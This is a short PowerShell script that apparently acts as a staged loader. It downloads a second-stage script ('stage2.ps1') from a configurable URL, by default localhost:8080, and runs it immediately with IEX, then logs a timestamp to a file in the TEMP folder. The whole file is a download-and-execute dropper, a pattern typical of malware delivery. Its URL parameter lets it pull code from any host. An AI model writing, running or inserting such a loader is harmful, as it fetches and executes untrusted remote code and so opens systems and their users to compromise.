
[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://localhost:8080/stage2.ps1",
    [int]$TimeoutSec = 147
)
try { IEX (Invoke-WebRequest -Uri $DownloadUrl -UseBasicParsing).Content; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Loader step failed" }
